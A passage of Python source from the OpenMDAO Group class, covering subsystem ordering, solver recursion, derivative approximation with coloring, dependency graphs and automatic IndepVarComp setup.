new execution order.\n        \"\"\"\n        if self._problem_meta is not None and \\\n                self._problem_meta['setup_status'] == _SetupStatus.POST_CONFIGURE:\n            raise RuntimeError(\"%s: Cannot call set_order in the configure method\" % (self.msginfo))\n\n        # Make sure the new_order is valid. It must contain all subsystems\n        # in this model.\n        newset = set(new_order)\n        if self._static_mode:\n            olddict = self._static_subsystems_allprocs\n        else:\n            olddict = self._subsystems_allprocs\n        oldset = set(olddict)\n\n        if oldset != newset:\n            msg = []\n\n            missing = oldset - newset\n            if missing:\n                msg.append(\"%s: %s expected in subsystem order and not found.\" %\n                           (self.msginfo, sorted(missing)))\n\n            extra = newset - oldset\n            if extra:\n                msg.append(\"%s: subsystem(s) %s found in subsystem order but don't exist.\" %\n                           (self.msginfo, sorted(extra)))\n\n            raise ValueError('\\n'.join(msg))\n\n        # Don't allow duplicates either.\n        if len(newset) < len(new_order):\n            dupes = [key for key, val in Counter(new_order).items() if val > 1]\n            raise ValueError(\"%s: Duplicate name(s) found in subsystem order list: %s\" %\n                             (self.msginfo, sorted(dupes)))\n\n        subsystems = {}  # need a fresh one to keep the right order\n        if self._static_mode:\n            self._static_subsystems_allprocs = subsystems\n        else:\n            self._subsystems_allprocs = subsystems\n\n        for i, name in enumerate(new_order):\n            sinfo = olddict[name]\n            subsystems[name] = sinfo\n            sinfo.index = i\n\n        self._order_set = True\n        if self._problem_meta is not None:\n            # order has been changed so we need a new full setup\n            self._problem_meta['setup_status'] = _SetupStatus.PRE_SETUP\n\n    def _get_subsystem(self, name):\n        \"\"\"\n        Return the system called 'name' in the current namespace.\n\n        Parameters\n        ----------\n        name : str\n            name of the desired system in the current namespace.\n\n        Returns\n        -------\n        System or None\n            System if found else None.\n        \"\"\"\n        if name == '':\n            return self\n\n        system = self\n        for subname in name.split('.'):\n            if subname in system._subsystems_allprocs:\n                system = system._subsystems_allprocs[subname].system\n            elif subname in system._static_subsystems_allprocs:\n                system = system._static_subsystems_allprocs[subname].system\n            else:\n                return None\n        return system\n\n    def _apply_nonlinear(self):\n        \"\"\"\n        Compute residuals. The model is assumed to be in a scaled state.\n        \"\"\"\n        self._transfer('nonlinear', 'fwd')\n        # Apply recursion\n        for subsys in self._subsystems_myproc:\n            subsys._apply_nonlinear()\n\n        self.iter_count_apply += 1\n\n    def _solve_nonlinear(self):\n        \"\"\"\n        Compute outputs. The model is assumed to be in a scaled state.\n        \"\"\"\n        name = self.pathname if self.pathname else 'root'\n\n        with Recording(name + '._solve_nonlinear', self.iter_count, self):\n            self._nonlinear_solver.solve()\n\n        # Iteration counter is incremented in the Recording context manager at exit.\n\n    def _guess_nonlinear(self):\n        \"\"\"\n        Provide initial guess for states.\n        \"\"\"\n        # let any lower level systems do their guessing first\n        if self._has_guess:\n            for sname, sinfo in self._subsystems_allprocs.items():\n                sub = sinfo.system\n                # TODO: could gather 'has_guess' information during setup and be able to\n                # skip transfer for subs that don't have guesses...\n                self._transfer('nonlinear', 'fwd', sname)\n                if sub._is_local and sub._has_guess:\n                    sub._guess_nonlinear()\n\n        # call our own guess_nonlinear method, after the recursion is done to\n        # all the lower level systems and the data transfers have happened\n        complex_step = self._inputs._under_complex_step\n\n        if complex_step:\n            self._inputs.set_complex_step_mode(False)\n            self._residuals.set_complex_step_mode(False)\n            self._outputs.set_complex_step_mode(False)\n\n        if self._discrete_inputs or self._discrete_outputs:\n            self.guess_nonlinear(self._inputs, self._outputs, self._residuals,\n                                 self._discrete_inputs, self._discrete_outputs)\n        else:\n            self.guess_nonlinear(self._inputs, self._outputs, self._residuals)\n\n        if complex_step:\n            self._inputs.set_complex_step_mode(True)\n            self._residuals.set_complex_step_mode(True)\n            self._outputs.set_complex_step_mode(True)\n\n    def guess_nonlinear(self, inputs, outputs, residuals,\n                        discrete_inputs=None, discrete_outputs=None):\n        \"\"\"\n        Provide initial guess for states.\n\n        Override this method to set the initial guess for states.\n\n        Parameters\n        ----------\n        inputs : Vector\n            unscaled, dimensional input variables read via inputs[key]\n        outputs : Vector\n            unscaled, dimensional output variables read via outputs[key]\n        residuals : Vector\n            unscaled, dimensional residuals written to via residuals[key]\n        discrete_inputs : dict or None\n            If not None, dict containing discrete input values.\n        discrete_outputs : dict or None\n            If not None, dict containing discrete output values.\n        \"\"\"\n        pass\n\n    def _apply_linear(self, jac, vec_names, rel_systems, mode, scope_out=None, scope_in=None):\n        \"\"\"\n        Compute jac-vec product. The model is assumed to be in a scaled state.\n\n        Parameters\n        ----------\n        jac : Jacobian or None\n            If None, use local jacobian, else use assembled jacobian jac.\n        vec_names : [str, ...]\n            list of names of the right-hand-side vectors.\n        rel_systems : set of str\n            Set of names of relevant systems based on the current linear solve.\n        mode : str\n            'fwd' or 'rev'.\n        scope_out : set or None\n            Set of absolute output names in the scope of this mat-vec product.\n            If None, all are in the scope.\n        scope_in : set or None\n            Set of absolute input names in the scope of this mat-vec product.\n            If None, all are in the scope.\n        \"\"\"\n        vec_names = [v for v in vec_names if v in self._rel_vec_names]\n\n        if self._owns_approx_jac:\n            jac = self._jacobian\n        elif jac is None and self._assembled_jac is not None:\n            jac = self._assembled_jac\n\n        if jac is not None:\n            for vec_name in vec_names:\n                with self._matvec_context(vec_name, scope_out, scope_in, mode) as vecs:\n                    d_inputs, d_outputs, d_residuals = vecs\n                    jac._apply(self, d_inputs, d_outputs, d_residuals, mode)\n        # Apply recursion\n        else:\n            if rel_systems is not None:\n                irrelevant_subs = [s for s in self._subsystems_myproc\n                                   if s.pathname not in rel_systems]\n            if mode == 'fwd':\n                for vec_name in vec_names:\n                    self._transfer(vec_name, mode)\n                if rel_systems is not None:\n                    for s in irrelevant_subs:\n                        # zero out dvecs of irrelevant subsystems\n                        s._vectors['residual']['linear'].set_val(0.0)\n\n            for subsys in self._subsystems_myproc:\n                if rel_systems is None or subsys.pathname in rel_systems:\n                    subsys._apply_linear(jac, vec_names, rel_systems, mode,\n                                         scope_out, scope_in)\n\n            if mode == 'rev':\n                for vec_name in vec_names:\n                    self._transfer(vec_name, mode)\n                    if rel_systems is not None:\n                        for s in irrelevant_subs:\n                            # zero out dvecs of irrelevant subsystems\n                            s._vectors['output']['linear'].set_val(0.0)\n\n    def _solve_linear(self, vec_names, mode, rel_systems):\n        \"\"\"\n        Apply inverse jac product. The model is assumed to be in a scaled state.\n\n        Parameters\n        ----------\n        vec_names : [str, ...]\n            list of names of the right-hand-side vectors.\n        mode : str\n            'fwd' or 'rev'.\n        rel_systems : set of str\n            Set of names of relevant systems based on the current linear solve.\n        \"\"\"\n        if self._owns_approx_jac:\n            # No subsolves if we are approximating our jacobian. Instead, we behave like an\n            # ExplicitComponent and pass on the values in the derivatives vectors.\n            for vec_name in vec_names:\n                if vec_name in self._rel_vec_names:\n                    d_outputs = self._vectors['output'][vec_name]\n                    d_residuals = self._vectors['residual'][vec_name]\n\n                    if mode == 'fwd':\n                        if self._has_resid_scaling:\n                            with self._unscaled_context(outputs=[d_outputs],\n                                                        residuals=[d_residuals]):\n                                d_outputs.set_vec(d_residuals)\n                        else:\n                            d_outputs.set_vec(d_residuals)\n\n                        # ExplicitComponent jacobian defined with -1 on diagonal.\n                        d_outputs *= -1.0\n\n                    else:  # rev\n                        if self._has_resid_scaling:\n                            with self._unscaled_context(outputs=[d_outputs],\n                                                        residuals=[d_residuals]):\n                                d_residuals.set_vec(d_outputs)\n                        else:\n                            d_residuals.set_vec(d_outputs)\n\n                        # ExplicitComponent jacobian defined with -1 on diagonal.\n                        d_residuals *= -1.0\n\n        else:\n            vec_names = [v for v in vec_names if v in self._rel_vec_names]\n            self._linear_solver.solve(vec_names, mode, rel_systems)\n\n    def _linearize(self, jac, sub_do_ln=True):\n        \"\"\"\n        Compute jacobian / factorization. The model is assumed to be in a scaled state.\n\n        Parameters\n        ----------\n        jac : Jacobian or None\n            If None, use local jacobian, else use assembled jacobian jac.\n        sub_do_ln : boolean\n            Flag indicating if the children should call linearize on their linear solvers.\n        \"\"\"\n        if self._jacobian is None:\n            self._jacobian = DictionaryJacobian(self)\n\n        self._check_first_linearize()\n\n        # Group finite difference\n        if self._owns_approx_jac:\n\n            jac = self._jacobian\n            if self.pathname == \"\":\n                for approximation in self._approx_schemes.values():\n                    approximation.compute_approximations(self, jac=jac, total=True)\n            else:\n                # When an approximation exists in a submodel (instead of in root), the model is\n                # in a scaled state.\n                with self._unscaled_context(outputs=[self._outputs]):\n                    for approximation in self._approx_schemes.values():\n                        approximation.compute_approximations(self, jac=jac, total=True)\n\n        else:\n            if self._assembled_jac is not None:\n                jac = self._assembled_jac\n\n            # Only linearize subsystems if we aren't approximating the derivs at this level.\n            for subsys in self._subsystems_myproc:\n                do_ln = sub_do_ln and (subsys._linear_solver is not None and\n                                       subsys._linear_solver._linearize_children())\n                subsys._linearize(jac, sub_do_ln=do_ln)\n\n            # Update jacobian\n            if self._assembled_jac is not None:\n                self._assembled_jac._update(self)\n\n            if sub_do_ln:\n                for subsys in self._subsystems_myproc:\n                    if subsys._linear_solver is not None:\n                        subsys._linear_solver._linearize()\n\n    def _check_first_linearize(self):\n        if self._first_call_to_linearize:\n            self._first_call_to_linearize = False  # only do this once\n            coloring = self._get_coloring() if coloring_mod._use_partial_sparsity else None\n\n            if coloring is not None:\n                if not self._coloring_info['dynamic']:\n                    coloring._check_config_partial(self)\n                self._setup_approx_coloring()\n            # TODO: for top level FD, call below is unnecessary, but we need this\n            # for some tests that just call run_linearize directly without calling\n            # compute_totals.\n            elif self._approx_schemes:\n                self._setup_approx_partials()\n\n    def approx_totals(self, method='fd', step=None, form=None, step_calc=None):\n        \"\"\"\n        Approximate derivatives for a Group using the specified approximation method.\n\n        Parameters\n        ----------\n        method : str\n            The type of approximation that should be used. Valid options include:\n            'fd': Finite Difference, 'cs': Complex Step\n        step : float\n            Step size for approximation. Defaults to None, in which case, the approximation\n            method provides its default value.\n        form : string\n            Form for finite difference, can be 'forward', 'backward', or 'central'. Defaults to\n            None, in which case, the approximation method provides its default value.\n        step_calc : string\n            Step type for finite difference, can be 'abs' for absolute', or 'rel' for\n            relative. Defaults to None, in which case, the approximation method\n            provides its default value.\n        \"\"\"\n        self._has_approx = True\n        self._approx_schemes = OrderedDict()\n        approx_scheme = self._get_approx_scheme(method)\n\n        default_opts = approx_scheme.DEFAULT_OPTIONS\n\n        kwargs = {}\n        for name, attr in (('step', step), ('form', form), ('step_calc', step_calc)):\n            if attr is not None:\n                if name in default_opts:\n                    kwargs[name] = attr\n                else:\n                    raise RuntimeError(\"%s: '%s' is not a valid option for '%s'\" % (self.msginfo,\n                                                                                    name, method))\n\n        self._owns_approx_jac = True\n        self._owns_approx_jac_meta = kwargs\n\n    def _setup_partials(self):\n        \"\"\"\n        Call setup_partials in components.\n        \"\"\"\n        self._subjacs_info = info = {}\n\n        for subsys in self._subsystems_myproc:\n            subsys._setup_partials()\n            info.update(subsys._subjacs_info)\n\n        if self._has_distrib_vars and self._owns_approx_jac:\n            # We currently cannot approximate across a group with a distributed component if the\n            # inputs are distributed via src_indices.\n            for iname, meta in self._var_allprocs_abs2meta['input'].items():\n                if meta['has_src_indices'] and \\\n                   meta['distributed'] and \\\n                   iname not in self._conn_abs_in2out:\n                    msg = \"{}: Approx_totals is not supported on a group with a distributed \"\n                    msg += \"component whose input '{}' is distributed using src_indices. \"\n                    raise RuntimeError(msg.format(self.msginfo, iname))\n\n    def _approx_subjac_keys_iter(self):\n        pro2abs = self._var_allprocs_prom2abs_list\n\n        if self._owns_approx_wrt and not self.pathname:\n            candidate_wrt = self._owns_approx_wrt\n        else:\n            candidate_wrt = list(var[0] for var in pro2abs['input'].values())\n\n        from openmdao.core.indepvarcomp import IndepVarComp\n        wrt = set()\n        ivc = set()\n        if self.pathname:  # get rid of any old stuff in here\n            self._owns_approx_of = self._owns_approx_wrt = None\n\n        for var in candidate_wrt:\n\n            # Weed out inputs connected to anything inside our system unless the source is an\n            # indepvarcomp.\n            if var in self._conn_abs_in2out:\n                src = self._conn_abs_in2out[var]\n                compname = src.rsplit('.', 1)[0]\n                comp = self._get_subsystem(compname)\n                if isinstance(comp, IndepVarComp):\n                    wrt.add(src)\n                    ivc.add(src)\n            else:\n                wrt.add(var)\n\n        if self._owns_approx_of:\n            of = set(self._owns_approx_of)\n        else:\n            of = set(var[0] for var in pro2abs['output'].values())\n            # Skip indepvarcomp res wrt other srcs\n            of -= ivc\n\n        for key in product(of, wrt.union(of)):\n            # Create approximations for the ones we need.\n\n            # Skip explicit res wrt outputs\n            if key[1] in of and key[1] not in ivc:\n\n                # Support for specifying a desvar as an obj/con.\n                if key[1] not in wrt or key[0] == key[1]:\n                    continue\n\n            yield key\n\n    def _jac_of_iter(self):\n        \"\"\"\n        Iterate over (name, start, end, idxs) for each 'of' (row) var in the systems's jacobian.\n\n        idxs will usually be the var slice into the full variable in the result array,\n        except in cases where _owns_approx__idx has a value for that variable, in which case it'll\n        be indices into the variable.\n\n        Yields\n        ------\n        of_name, start, end, result_variable_slice_or_idxs\n        \"\"\"\n        abs2meta = self._var_allprocs_abs2meta['output']\n        approx_of_idx = self._owns_approx_of_idx\n\n        if self._owns_approx_of:\n            # we're computing totals/semi-totals (vars may not be local)\n            start = end = 0\n            for of in self._owns_approx_of:\n                if of in approx_of_idx:\n                    end += len(approx_of_idx[of])\n                    yield of, start, end, np.atleast_1d(approx_of_idx[of])\n                else:\n                    end += abs2meta[of]['size']\n                    yield of, start, end, _full_slice\n\n                start = end\n        else:\n            yield from super()._jac_of_iter()\n\n    def _jac_wrt_iter(self, wrt_matches=None):\n        \"\"\"\n        Iterate over (name, start, end, vec, locinds) for each column var in the systems's jacobian.\n\n        Parameters\n        ----------\n        wrt_matches : set or None\n            Only include vars in each row that are contained in this set.  This will determine what\n            the actual offsets are, i.e. the offsets will be into a reduced jacobian\n            containing only the matching columns.\n\n        Yields\n        ------\n        wrt_name, start, end, vec, locinds\n        \"\"\"\n        if self._owns_approx_wrt:\n            abs2meta = self._var_allprocs_abs2meta\n            approx_wrt_idx = self._owns_approx_wrt_idx\n            local_ins = self._var_abs2meta['input']\n            local_outs = self._var_abs2meta['output']\n\n            offset = end = 0\n            if self.pathname:  # doing semitotals, so include output columns\n                for of, _offset, _end, _ in self._jac_of_iter():\n                    if wrt_matches is None or of in wrt_matches:\n                        end += (_end - _offset)\n                        vec = self._outputs if of in local_outs else None\n                        yield of, offset, end, vec, _full_slice\n                        offset = end\n\n            for wrt in self._owns_approx_wrt:\n                if wrt_matches is None or wrt in wrt_matches:\n                    if wrt in local_ins:\n                        vec = self._inputs\n                    elif wrt in local_outs:\n                        vec = self._outputs\n                    else:\n                        vec = None\n                    if wrt in approx_wrt_idx:\n                        sub_wrt_idx = approx_wrt_idx[wrt]\n                        size = len(sub_wrt_idx)\n                    else:\n                        sub_wrt_idx = _full_slice\n                        if wrt in abs2meta['input']:\n                            size = abs2meta['input'][wrt]['size']\n                        else:\n                            size = abs2meta['output'][wrt]['size']\n                    end += size\n                    yield wrt, offset, end, vec, sub_wrt_idx\n                    offset = end\n        else:\n            yield from super()._jac_wrt_iter(wrt_matches)\n\n    def _update_wrt_matches(self, info):\n        \"\"\"\n        Determine the list of wrt variables that match the wildcard(s) given in declare_coloring.\n\n        Parameters\n        ----------\n        info : dict\n            Coloring metadata dict.\n        \"\"\"\n        if not (self._owns_approx_of or self.pathname):\n            return\n\n        wrt_color_patterns = info['wrt_patterns']\n\n        info['wrt_matches'] = wrt_colors_matched = set()\n\n        if wrt_color_patterns:\n            abs2prom = self._var_allprocs_abs2prom\n            for _, wrt in self._get_approx_subjac_keys():\n                if wrt in wrt_colors_matched:\n                    continue\n                if wrt in abs2prom['output']:\n                    wrtprom = abs2prom['output'][wrt]\n                else:\n                    wrtprom = abs2prom['input'][wrt]\n\n                for patt in wrt_color_patterns:\n                    if patt == '*' or fnmatchcase(wrtprom, patt):\n                        wrt_colors_matched.add(wrt)\n                        break\n\n        baselen = len(self.pathname) + 1 if self.pathname else 0\n        info['wrt_matches_rel'] = [n[baselen:] for n in wrt_colors_matched]\n\n        if info.get('dynamic') and info['coloring'] is None and self._owns_approx_of:\n            if not wrt_colors_matched:\n                raise ValueError(\"{}: Invalid 'wrt' variable(s) specified for colored approx \"\n                                 \"partial options: {}.\".format(self.msginfo, wrt_color_patterns))\n\n    def _setup_approx_partials(self):\n        \"\"\"\n        Add approximations for all approx derivs.\n        \"\"\"\n        self._jacobian = DictionaryJacobian(system=self)\n\n        abs2prom = self._var_allprocs_abs2prom\n        abs2meta = self._var_allprocs_abs2meta\n        info = self._coloring_info\n\n        if info['coloring'] is not None and (self._owns_approx_of is None or\n                                             self._owns_approx_wrt is None):\n            method = info['method']\n        else:\n            method = list(self._approx_schemes)[0]\n\n        wrt_matches = self._get_static_wrt_matches()\n\n        approx = self._get_approx_scheme(method)\n        # reset the approx if necessary\n        approx._wrt_meta = {}\n        approx._reset()\n\n        approx_keys = self._get_approx_subjac_keys()\n        for key in approx_keys:\n            if key in self._subjacs_info:\n                meta = self._subjacs_info[key]\n            else:\n                meta = SUBJAC_META_DEFAULTS.copy()\n                if key[0] == key[1]:\n                    size = abs2meta['output'][key[0]]['size']\n                    meta['rows'] = meta['cols'] = np.arange(size)\n                    # All group approximations are treated as explicit components, so we\n                    # have a -1 on the diagonal.\n                    meta['value'] = np.full(size, -1.0)\n                self._subjacs_info[key] = meta\n\n            meta['method'] = method\n\n            meta.update(self._owns_approx_jac_meta)\n\n            if wrt_matches is None or key[1] in wrt_matches:\n                self._update_approx_coloring_meta(meta)\n\n            if meta['value'] is None:\n                if key[1] in abs2meta['input']:\n                    sz = abs2meta['input'][key[1]]['size']\n                else:\n                    sz = abs2meta['output'][key[1]]['size']\n                shape = (abs2meta['output'][key[0]]['size'], sz)\n                meta['shape'] = shape\n                if meta['rows'] is not None:  # subjac is sparse\n                    meta['value'] = np.zeros(len(meta['rows']))\n                else:\n                    meta['value'] = np.zeros(shape)\n\n            approx.add_approximation(key, self, meta)\n\n        if self.pathname:\n            abs_outs = self._var_allprocs_abs2meta['output']\n            abs_ins = self._var_allprocs_abs2meta['input']\n            # we're taking semi-total derivs for this group. Update _owns_approx_of\n            # and _owns_approx_wrt so we can use the same approx code for totals and\n            # semi-totals.  Also, the order must match order of vars in the output and\n            # input vectors.\n            wrtset = set([k[1] for k in approx_keys])\n            self._owns_approx_of = list(abs_outs)\n            self._owns_approx_wrt = [n for n in chain(abs_outs, abs_ins) if n in wrtset]\n            self._owns_approx_jac = True\n\n    def _setup_approx_coloring(self):\n        \"\"\"\n        Ensure that if coloring is declared, approximations will be set up.\n        \"\"\"\n        if self._coloring_info['coloring'] is not None:\n            meta = self._coloring_info\n            self.approx_totals(meta['method'], meta.get('step'), meta.get('form'))\n        self._setup_approx_partials()\n\n    def _update_approx_coloring_meta(self, meta):\n        \"\"\"\n        Update metadata for a subjac based on coloring metadata.\n\n        Parameters\n        ----------\n        meta : dict\n            Metadata for a subjac.\n        \"\"\"\n        info = self._coloring_info\n        meta['coloring'] = True\n        for name in ('method', 'step', 'form'):\n            if name in info:\n                meta[name] = info[name]\n\n    def compute_sys_graph(self, comps_only=False):\n        \"\"\"\n        Compute a dependency graph for subsystems in this group.\n\n        Variable connection information is stored in each edge of\n        the system graph.\n\n        Parameters\n        ----------\n        comps_only : bool (False)\n            If True, return a graph of all components within this group\n            or any of its descendants. No sub-groups will be included. Otherwise,\n            a graph containing only direct children (both Components and Groups)\n            of this group will be returned.\n\n        Returns\n        -------\n        DiGraph\n            A directed graph containing names of subsystems and their connections.\n        \"\"\"\n        input_srcs = self._conn_global_abs_in2out\n        glen = len(self.pathname.split('.')) if self.pathname else 0\n        graph = nx.DiGraph()\n\n        # add all systems as nodes in the graph so they'll be there even if\n        # unconnected.\n        if comps_only:\n            systems = [s.pathname for s in self.system_iter(recurse=True, typ=Component)]\n        else:\n            systems = [s.name for s in self._subsystems_myproc]\n\n        if MPI:\n            sysbyproc = self.comm.allgather(systems)\n\n            systems = set()\n            for slist in sysbyproc:\n                systems.update(slist)\n\n        graph.add_nodes_from(systems)\n\n        edge_data = defaultdict(lambda: defaultdict(list))\n\n        for in_abs, src_abs in input_srcs.items():\n            if src_abs is not None:\n                if comps_only:\n                    src = src_abs.rsplit('.', 1)[0]\n                    tgt = in_abs.rsplit('.', 1)[0]\n                else:\n                    src = src_abs.split('.')[glen]\n                    tgt = in_abs.split('.')[glen]\n\n                # store var connection data in each system to system edge for later\n                # use in relevance calculation.\n                edge_data[(src, tgt)][src_abs].append(in_abs)\n\n        for key in edge_data:\n            src_sys, tgt_sys = key\n            if comps_only or src_sys != tgt_sys:\n                graph.add_edge(src_sys, tgt_sys, conns=edge_data[key])\n\n        return graph\n\n    def _get_auto_ivc_out_val(self, tgts, vars_to_gather, all_abs2meta_in, abs2meta_in):  # , tree):\n        # all tgts are continuous variables\n        # only called from top level group\n        info = None\n        src_idx_found = []\n        abs2prom = self._var_allprocs_abs2prom['input']\n        max_size = -1\n        found_dup = False\n\n        for tgt in tgts:\n            all_meta = all_abs2meta_in[tgt]\n            if all_meta['distributed']:\n                # OpenMDAO currently can't create an automatic IndepVarComp for inputs on\n                # distributed components.\n                raise RuntimeError(f'Distributed component input \"{tgt}\" requires an IndepVarComp.')\n\n            if tgt in vars_to_gather and self.comm.rank != vars_to_gather[tgt]:\n                if info is None or 0 > max_size:\n                    info = (tgt, 0, np.zeros(0), True)\n                continue\n\n            # if we get here, tgt is local\n            prom = abs2prom[tgt]\n            meta = abs2meta_in[tgt]\n            size = meta['size']\n            has_src_inds = meta['src_indices'] is not None\n\n            value = meta['value']\n            val = None\n            if prom in self._var_prom2inds:\n                src_shape = self._var_prom2inds[prom][0]\n                if src_shape is not None:\n                    val = np.ones(src_shape)\n\n            if has_src_inds:\n                if val is None:\n                    src_idx_found.append(tgt)\n                else:\n                    try:\n                        if meta['flat_src_indices'] and not _is_slicer_op(meta['src_indices']):\n                            val.ravel()[meta['src_indices']] = value\n                        else:\n                            val[meta['src_indices']] = value\n                    except ValueError as err:\n                        print(err)\n                        src = self._conn_global_abs_in2out[tgt]\n                        src_indices = meta['src_indices']\n                        if _is_slicer_op(src_indices):\n                            src_indices = _slice_indices(src_indices, size, meta['shape'])\n                        msg = f\"{self.msginfo}: The source indices \" + \\\n                              f\"{src_indices} do not specify a \" + \\\n                              f\"valid shape for the connection '{src}' to \" + \\\n                              f\"'{tgt}'. The target shape is \" + \\\n                              f\"{meta['shape']} but indices have shape {src_indices.shape}.\"\n                        raise ValueError(msg)\n            else:\n                if val is None:\n                    val = value\n                else:\n                    val[:] = value\n\n                if tgt not in vars_to_gather:\n                    found_dup = True\n\n            if size > max_size:\n                max_size = size\n                info = (tgt, size, val, False)\n\n        if src_idx_found and not found_dup:  # auto_ivc connected to local vars with src_indices\n            raise RuntimeError(f\"The following inputs {src_idx_found} are defined using \"\n                               \"src_indices but the total source size is undetermined.  You can \"\n                               \"specify the src size by setting 'val' or 'src_shape' in \"\n                               \"a call to set_input_defaults, or by adding \"\n                               \"an IndepVarComp as the source.\")\n\n        # return max sized (tgt, size, value, remote)\n        return info\n\n    def _setup_auto_ivcs(self, mode):\n        # only happens at top level\n        from openmdao.core.indepvarcomp import _AutoIndepVarComp\n\n        if self.comm.size > 1 and self._mpi_proc_allocator.parallel:\n            raise RuntimeError(\"The top level system must not be a ParallelGroup.\")\n\n        # create the IndepVarComp that will contain all auto-ivc outputs\n        self._auto_ivc = auto_ivc = _AutoIndepVarComp()\n        auto_ivc.name = '_auto_ivc'\n        auto_ivc.pathname = auto_ivc.name\n\n        prom2auto = {}\n        count = 0\n        auto2tgt = {}\n        abs2prom = self._var_allprocs_abs2prom['input']\n        abs2meta = self._var_abs2meta['input']\n        all_abs2meta = self._var_allprocs_abs2meta['input']\n        conns = self._conn_global_abs_in2out\n        auto_conns = {}\n        nproc = self.comm.size\n\n        for tgt in all_abs2meta:\n            if tgt in conns:\n                continue\n\n            prom = abs2prom[tgt]\n            if prom in prom2auto:\n                # multiple connected inputs w/o a src. Connect them to the same IVC\n                src = prom2auto[prom][0]\n                auto_conns[tgt] = src\n            else:\n                src = f\"_auto_ivc.v{count}\"\n                count += 1\n                prom2auto[prom] = (src, tgt)\n                auto_conns[tgt] = src\n\n            if src in auto2tgt:\n                auto2tgt[src].append(tgt)\n            else:\n                auto2tgt[src] = [tgt]\n\n        conns.update(auto_conns)\n\n        abs2meta_in = self._var_abs2meta['input']\n        tdict = {t: (_PromotesInfo(), None, t, self.pathname) for t, _ in auto_conns.items()\n                 if t in abs2meta_in}\n        self._resolve_src_inds(tdict, self)\n\n        vars2gather = self._vars_to_gather\n\n        for src, tgts in auto2tgt.items():\n            tgt, _, val, remote = self._get_auto_ivc_out_val(tgts, vars2gather,\n                                                             all_abs2meta, abs2meta)\n\n            prom = abs2prom[tgt]\n            if prom not in self._group_inputs:\n                self._group_inputs[prom] = [{'use_tgt': tgt, 'auto': True, 'path': self.pathname,\n                                             'prom': prom}]\n            else:\n                self._group_inputs[prom][0]['use_tgt'] = tgt\n            gmeta = self._group_inputs[prom][0]\n\n            if 'units' in gmeta:\n                units = gmeta['units']\n            else:\n                units = all_abs2meta[tgt]['units']\n\n            if not remote and 'value' in gmeta:\n                val = gmeta['value']\n            relsrc = src.rsplit('.', 1)[-1]\n            auto_ivc.add_output(relsrc, val=val, units=units)\n            if remote:\n                auto_ivc._add_remote(relsrc)\n\n        # have to sort to keep vars in sync because we may be doing bcasts\n        for abs_in in sorted(self._var_allprocs_discrete['input']):\n            if abs_in not in conns:  # unconnected, so connect the input to an _auto_ivc output\n                prom = abs2prom[abs_in]\n                val = _UNDEFINED\n\n                if prom in prom2auto:\n                    # multiple connected inputs w/o a src. Connect them to the same IVC\n                    # check if they have different metadata, and if they do, there must be\n                    # a group input defined that sets the default, else it's an error\n                    conns[abs_in] = prom2auto[prom][0]\n                else:\n                    ivc_name = f\"_auto_ivc.v{count}\"\n                    loc_out_name = ivc_name.rsplit('.', 1)[-1]\n                    count += 1\n                    prom2auto[prom] = (ivc_name, abs_in)\n                    conns[abs_in] = ivc_name\n\n                    if abs_in in self._var_abs2prom['input']:  # var is local\n                        val = self._var_discrete['input'][abs_in]['value']\n                    else:\n                        val = None\n                    if abs_in in vars2gather:\n                        if vars2gather[abs_in] == self.comm.rank:\n                            self.comm.bcast(val, root=vars2gather[abs_in])\n                        else:\n                            val = self.comm.bcast(None, root=vars2gather[abs_in])\n                    auto_ivc.add_discrete_output(loc_out_name, val=val)\n\n        if not prom2auto:\n            return auto_ivc\n\n        auto_ivc._setup_procs(auto_ivc.pathname, self.comm, mode, self._problem_meta)\n        auto_ivc._configure()\n        auto_ivc._configure_check()\n        auto_ivc._setup_var_data()\n\n        # now update our own data structures based on the new auto_ivc component variables\n        old = self._subsystems_allprocs\n        self._subsystems_allprocs = allsubs = OrderedDict()\n        allsubs['_auto_ivc'] = _SysInfo(auto_ivc, 0)\n        for i, (name, s) in enumerate(old.items()):\n            allsubs[name] = s\n            s.index = i + 1\n\n        self._subsystems_myproc = [auto_ivc] + self._subsystems_myproc\n\n        io = 'output'  # auto_ivc has only output vars\n        old = self._var_allprocs_prom2abs_list[io]\n        p2abs = OrderedDict()\n        for name in auto_ivc._var_allprocs_abs2meta[io]:\n            p2abs[name] = [name]\n        p2abs.update(old)\n        self._var_allprocs_prom2abs_list[io] = p2abs\n\n        # auto_ivc never promotes anything\n        self._var_abs2prom[io].update({n: n for n in auto_ivc._var_abs2prom[io]})\n        self._var_allprocs_abs2prom[io].update({n: n for n in\n                                                auto_ivc._var_allprocs_abs2prom[io]})\n\n        self._var_discrete[io].update({'_auto_ivc.' + k: v for k, v in\n                                       auto_ivc._var_discrete[io].items()})\n        self._var_allprocs_discrete[io].update(auto_ivc._var_allprocs_discrete[io])\n\n        old = self._var_abs2meta[io]\n        self._var_abs2meta[io] = {}\n        self._var_abs2meta[io].update(auto_ivc._var_abs2meta[io])\n        self._var_abs2meta[io].update(old)\n\n        old = self._var_allprocs_abs2meta[io]\n        self._var_allprocs_abs2meta[io] = {}\n        self._var_allprocs_abs2meta[io].update(auto_ivc._var_allprocs_abs2meta[io])\n        self._var_allprocs_abs2meta[io].update(old)\n\n        self._approx_subjac_keys = None  # this will force re-initialization\n        self._setup_procs_finished = True\n\n        return auto_ivc\n\n    def _resolve_ambiguous_input_meta(self):\n        \"\"\"\n        Resolve ambiguous input units and values for auto_ivcs with multiple targets.\n\n        This should only be called on the top level Group.\n        \"\"\"\n        srcconns = {}\n        for tgt, src in self._conn_global_abs_in2out.items():\n            if src.startswith('_auto_ivc.'):\n                if src in srcconns:\n                    srcconns[src].append(tgt)\n                else:\n                    srcconns[src] = [tgt]\n\n        abs2prom = self._var_allprocs_abs2prom['input']\n        all_abs2meta_in = self._var_allprocs_abs2meta['input']\n        all_abs2meta_out = self._var_allprocs_abs2meta['output']\n        abs2meta_in = self._var_abs2meta['input']\n        abs2meta_out = self._var_abs2meta['output']\n        all_discrete_outs = self._var_allprocs_discrete['output']\n        all_discrete_ins = self._var_allprocs_discrete['input']\n\n        for src, tgts in srcconns.items():\n            if len(tgts) < 2:\n                continue\n            if src not in all_discrete_outs:\n                smeta = all_abs2meta_out[src]\n                sunits = smeta['units'] if 'units' in smeta else None\n\n            sval = self.get_val(src, kind='output', get_remote=True, from_src=False)\n            errs = set()\n            metadata = set()\n\n            prom = abs2prom[tgts[0]]\n            if prom not in self._group_inputs:\n                self._group_inputs[prom] = [{'path': self.pathname, 'prom': prom, 'auto': True}]\n\n            gmeta = self._group_inputs[prom][0]\n\n            for tgt in tgts:\n                tval = self.get_val(tgt, kind='input', get_remote=True, from_src=False)\n\n                if tgt in all_discrete_ins:\n                    if 'value' not in gmeta and 